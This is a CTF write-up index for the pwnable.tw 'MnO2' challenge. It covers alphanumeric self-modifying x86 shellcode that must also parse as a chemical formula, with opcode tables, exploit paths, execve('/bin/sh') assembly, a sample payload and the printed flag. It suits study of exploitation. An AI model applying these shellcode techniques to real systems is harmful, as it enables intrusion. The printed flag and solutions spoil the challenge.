---
tags:
  - alpha-shellcode
  - seccomp-bypass
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "Alphanumeric shellcode execution in a fixed RWX memory region under seccomp restrictions, using self-modifying code to craft syscall instructions."
proof-of-concept: no
---

# MnO2 — pwnable.tw (300 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10301`
>
> Flag: `FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}`

## Challenge Overview

A 32-bit Linux binary that reads user input with `scanf("%s")` into a fixed RWX `mmap`'d region at `0x324F6E4D` ("MnO2" in little-endian ASCII). A validation function `check()` then verifies that the input is a **valid chemical formula** — every byte must be alphanumeric, and the string must tokenize as a sequence of real periodic-table element symbols (uppercase letter, optional lowercase, optional digits). If the check passes, the program does `call eax` where `eax` points to the buffer — executing the input as **shellcode**.

The core challenge: write **alphanumeric shellcode that is simultaneously a valid chemical formula**.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled (but mmap region is RWX)
  PIE:      No PIE
```

### Register State at `call eax`

```
EAX = 0x324F6E4D  (buffer address, also shellcode entry point)
EBX = 0x00000000
ECX = 0x00000000  (or ptr to element table, varies by libc)
EDX = 0x080489cc  (or similar code pointer)
ESI = libc GOT    (e.g. 0xf7faf000)
EDI = libc GOT    (same as ESI)
```

## Vulnerability

### V1 — Direct Shellcode Execution on RWX Page (Constrained)

**Root Cause:** `main()` mmaps a fixed RWX region, reads user input into it, validates the formula, then jumps to it. There is no W^X enforcement on the mmap'd buffer — if you pass the chemical formula validator, your input runs as native x86 code.

**Constraint:** Every byte must be alphanumeric (`[0-9A-Za-z]`) AND must parse as a valid sequence of element symbols from the periodic table (H, He, Li, Be, B, C, N, O, F, Ne, Na, ..., Lv) with optional trailing digits.

This means the usable instruction set is severely restricted to what alphanumeric bytes encode in x86:

## Usable Instruction Set

### Single-byte Elements (direct x86 opcodes)

| Element | Hex | x86 Instruction |
|---------|-----|-----------------|
| `H` | `0x48` | `dec eax` |
| `B` | `0x42` | `inc edx` |
| `C` | `0x43` | `inc ebx` |
| `N` | `0x4E` | `dec esi` |
| `O` | `0x4F` | `dec edi` |
| `F` | `0x46` | `inc esi` |
| `P` | `0x50` | `push eax` |
| `S` | `0x53` | `push ebx` |
| `K` | `0x4B` | `dec ebx` |
| `V` | `0x56` | `push esi` |
| `W` | `0x57` | `push edi` |
| `U` | `0x55` | `push ebp` |
| `Y` | `0x59` | `pop ecx` |
| `I` | `0x49` | `dec ecx` |

### Two-byte Elements (multi-byte gadgets)

| Element | Bytes | Effect |
|---------|-------|--------|
| `Xe` | `0x58 0x65` | `pop eax; gs` (prefix) |
| `Na` | `0x4E 0x61` | `dec esi; popad` |
| `Ba` | `0x42 0x61` | `inc edx; popad` |
| `Ca` | `0x43 0x61` | `inc ebx; popad` |
| `Bh` | `0x42 0x68` | `inc edx; push imm32` |
| `Th` | `0x54 0x68` | `push esp; push imm32` |
| `Rh` | `0x52 0x68` | `push edx; push imm32` |
| `Re` | `0x52 0x65` | `push edx; gs` (prefix) |
| `Zr` | `0x5A 0x72` | `pop edx; jb` (short jump, often falls through) |
| `Ar` | `0x41 0x72` | `inc ecx; jb` (short jump) |
| `Ag` | `0x41 0x67` | `inc ecx; addr16` (prefix) |

### Digit-pair Gadgets (number suffixes that form instructions)

| Digits | Bytes | x86 Instruction |
|--------|-------|-----------------|
| `10` | `0x31 0x30` | `xor [eax], esi` |
| `11` | `0x31 0x31` | `xor [ecx], esi` |
| `12` | `0x31 0x32` | `xor [edx], esi` |
| `01` | `0x30 0x31` | `xor [ecx], dh` |
| `30` | `0x33 0x30` | `xor esi, [eax]` |
| `32` | `0x33 0x32` | `xor esi, [edx]` |
| `41`–`49` | `0x34 0x3N` | `xor al, imm8` |
| `50000` | `0x35 ...` | `xor eax, imm32` |

## Exploit Paths

All solutions must produce shellcode that passes the chemical formula validator. Since `int 0x80` (`\xcd\x80`) and `/bin/sh` are not alphanumeric, every approach uses **self-modifying code** or a **two-stage strategy**. The solutions fall into several categories:

---

### Path A — Two-Stage: Alphanumeric `read()` Stub → Unconstrained Stage 2 (Most Common)

**Used by:** Solutions 59, 378, 799, 1074, 1155, 1236, 1303, 1395, 2972, 3480, 3578, 7641, 8410, 15989, 21490, 31599, and exp.py

**Concept:** Stage 1 (the formula) is a self-modifying decoder that:
1. Patches `int 0x80` (`\xcd\x80`) into itself at a known offset using XOR operations
2. Sets up registers for `read(0, buf, big_count)` — `eax=3, ebx=0, ecx=buf, edx=large`
3. Falls through a NOP sled (e.g., `N` = `dec esi`, `O` = `dec edi`, `B` = `inc edx`) to the patched `int 0x80`
4. Stage 2 (unconstrained binary) is read in, overwriting the buffer, then executes standard `execve("/bin/sh")` shellcode

**Key Techniques for Patching `int 0x80`:**

- **XOR with ESI/EDI:** Zero out ESI via `popad` or self-XOR, then build the target value. Use `xor [ecx], esi` (digit `11`) or `xor [eax], esi` (digit `10`) to write arbitrary bytes.
- **XOR with DH:** Use `xor [ecx], dh` (digit `01`) for byte-level writes after loading DH via `push`/`pop` sequences.
- **XOR with AL:** Use `xor al, imm8` (digit `4N`) combined with `xor [ecx+offset], al` to patch memory.
- **Placeholder bytes:** Place `2O` (= `0x32 0x4F`) at a known offset, then XOR it with the right value to produce `0xCD 0x80`.

**Setting EAX=3 (SYS_read):**
- `5MnO2` = `xor eax, 0x324F6E4D` → zeroes EAX (since EAX already holds `0x324F6E4D`)
- Then `xor al, 0x31; xor al, 0x32` → `al = 3`
- Or: push 3 via `inc ebx*3; push ebx; pop eax; Xe; dec ebx*3`

**Setting EBX=0 (fd=stdin):**
- `popad` (`Na`, `Ba`, `Ca`) pops 8 registers from stack; pre-push zeroes to get `ebx=0`
- Or EBX is already 0 at entry

**Setting ECX (buffer address):**
- `push eax; pop ecx` (`PY`) since EAX = buffer address

**Stage 2:** Standard NOP sled + `execve("/bin/sh")`:
```nasm
xor eax, eax
push eax
push 0x68732f2f  ; "//sh"
push 0x6e69622f  ; "/bin"
mov ebx, esp
push eax
push ebx
mov ecx, esp
cdq               ; edx = 0
mov al, 0xb
int 0x80
```

**Example minimal formula (solution 1155):**
```
PYKSXe4N410AcISXe420AcCCCCSXeKKKBBBBBBAu9
```

---

### Path B — Single-Stage: Write Entire `execve` In-Place via XOR Loops

**Used by:** Solutions 786, 2233, 8153

**Concept:** Instead of calling `read()`, patch the **entire** `execve("/bin/sh")` shellcode byte-by-byte into memory using XOR gadgets. This avoids needing a second `send()`.

**Technique:** For each shellcode byte:
1. `inc esi` (`F`) the required number of times to set ESI to the target byte
2. `xor [ecx], esi` (`11`) to write it
3. `dec esi` (`N`) to reset, `inc ecx` (`Ar`) to advance

Solution 786 literally does `inc esi * ord(c); xor; dec esi * ord(c); xor; inc ecx` for each byte of the shellcode. This produces an enormous payload but works in a single stage.

Solution 8153 is similar, using a detailed byte-by-byte approach to construct `/bin/sh` in ESI/EDI registers via triple-XOR patterns, construct `int 0x80` via memory XOR, then set up `popad` to load all registers and execute the syscall.

**Downside:** Payloads can be thousands of bytes long (up to ~31337, the stated limit).

---

### Path C — Build ROP Chain + `ret` via Self-Modification

**Used by:** Solutions 408, 823

**Concept:** Instead of directly executing shellcode, construct a `ret` instruction (`0xC3`) via XOR at the end of the formula. Meanwhile, push a ROP chain (or a `scanf` call) onto the stack. When execution reaches the patched `ret`, it returns into the ROP chain.

**Solution 408 specifics:**
1. Use `popad` to load controlled values into registers
2. Compute `scanf`'s PLT address via `dec eax` + `xor eax, imm32` sequences
3. Push `scanf(format="%s", buf=rwx_addr)` frame onto the stack
4. Patch a `ret` (`0xC3 = 0x46 ^ 0x85`) by XOR-writing to the end of the payload
5. `ret` → `scanf` reads unconstrained stage 2 → `execve`

**Solution 823 specifics:**
1. Use the GOT address (already in EDI at entry) as a base
2. `dec ebx` + `xor [edx], bl` in a loop to subtract from the GOT pointer until it points to a one-gadget in libc
3. Patch `ret` via XOR with ESI, push the computed one-gadget address, and `ret` into it

---

### Path D — Forge `int 0x80` + Build `/bin/sh` Entirely In Registers

**Used by:** Solution 8153 (the 2-day marathon solution), 2233

**Concept:** Never call `read()` or `scanf`. Instead, construct the entire `execve("/bin/sh", argv, NULL)` syscall using only formula-valid instructions:
1. Build `/bin/sh\0` in memory via XOR chains (using ESI/EDI to hold partial values, XOR to stack-pushed constants, then write via `xor [addr], reg`)
2. Set EBX → pointer to `/bin/sh`, ECX=0, EDX=0, EAX=0xb
3. Construct `int 0x80` at a known address using the same XOR technique
4. Fall through or jump to it

This is the hardest and most tedious path but requires only a single payload.

## Exploit Primitive Summary

| Primitive | Technique | Notes |
|-----------|-----------|-------|
| Zero EAX | `5MnO2` (xor eax, 0x324f6e4d) | EAX already holds this value |
| Zero ESI/EDI | `popad` with pushed zeroes | Or XOR with memory: `30` = `xor esi, [eax]` |
| Zero EBX | Already 0 at entry, or `popad` | |
| Set EAX=3 | XOR sequences: `41` `42` etc. | `xor al, 0x31; xor al, 0x32` = 3 |
| Set ECX=buf | `PY` (push eax; pop ecx) | EAX = buf at entry |
| Write arbitrary byte | XOR: `inc esi*N; xor [ecx],esi; dec esi*N` | Slow but universal |
| Push imm32 | `Bh`, `Th`, `Rh` + 4 alphanum bytes | Element prefix + 4 bytes |
| Patch `int 0x80` | XOR `0x324F` or `0x3131` → `0xCD80` | Various XOR key combos |
| NOP sled | `N` (dec esi), `O` (dec edi), `B` (inc edx), `F` (inc esi) | Harmless single-byte elements |
| `popad` | `Na`, `Ba`, `Ca` | Load 8 registers from stack |

## Key Offsets

```python
BUF         = 0x324F6E4D   # Fixed mmap'd RWX buffer (= "MnO2" in LE)
mmap_base   = 0x324F6000   # mmap hint address
scanf_plt   = 0x08048420   # (binary-specific)
element_tbl = 0x08048890   # Periodic table strings in .rodata
```

## Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `59.md` | A | XOR-patch `int 0x80` via `[ecx+0x73]`; `push/pop` for eax=3 | Annotated ASM for each compound |
| `378.md` | A | Compact formula; XOR to build `int 0x80` | Short payload |
| `408.md` | C | Build ROP for `scanf()`; patch `ret` via XOR | Elegant stack-pivot approach |
| `751.md` | B | Perl one-liner; `dec eax` + `xor [eax],esi` byte writer | Bash-only, no Python |
| `755.md` | D | Massive XOR chains to build `/bin/sh` and `int 0x80` in-place | 2048+ byte single-stage |
| `786.md` | B | `inc esi*N; xor; dec esi*N` per byte of execve | Brute-force byte-by-byte |
| `799.md` | A | `popad` zeroing + `xor` to patch; clean minimal | |
| `823.md` | C | GOT-relative one_gadget; spray `dec ebx` + XOR loop | libc-dependent |
| `1074.md` | A | Self-modify; patch `int 0x80` and `/bin/sh` | Compact |
| `1155.md` | A | Minimal: XOR [eax+0x65] to patch; `call read` in 43 bytes | Shortest known formula |
| `1236.md` | A | `popad` + XOR via `Rh` pushes | Clean register setup |
| `1303.md` | A | `Rh` push + `xor [eax],dh` for patching | |
| `1395.md` | A | `5MnO2` to zero EAX; `popad` for register setup | Minimal and clean |
| `2121.md` | A | XOR `[eax+0x65]` with ecx; push/pop for eax=3 | |
| `2233.md` | A | `xor dword ptr [eax+0x50],edx` + xor chain | Uses `[eax+imm]` indexing |
| `2972.md` | A | `inc ecx` via `At0`; `xor [esi+0x34], ecx` byte writer | Long but methodical |
| `3480.md` | A | Compact: `5MnO2` zero + `Ag` inc_ecx | |
| `3578.md` | A | `xor [ecx+ebp*2+offset]` indexed writes | Uses EBP as index |
| `6247.md` | A | `pop edx` via `Zr`; `push val` via `Bh` | |
| `7641.md` | A | `xor [eax+0x65], al` + `Hf` prefix writes | |
| `8153.md` | D | Full single-stage: build `/bin/sh` in ESI/EDI, forge `int 0x80` | 2-day effort; 370+ lines |
| `8410.md` | A | `xor [eax+0x65],ecx` with `Th` pushes | |
| `15989.md` | A | `Si2` xor gadgets; padding with `O` NOPs | |
| `21490.md` | A | `xor esi,[eax]` then `xor [ecx],esi` chain | Full ASM gadget table |
| `31599.md` | A | `1He` xor + `Ag` inc_ecx + `ThK111` push | Compact with XOR tricks |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working two-stage exploit (formula → `read()` → `execve`) |
| `desc.txt` | Challenge description |
| `artifacts/mno2` | Original challenge binary (i386, stripped) |
| `solution/*.md` | Community write-ups (72 solutions) |
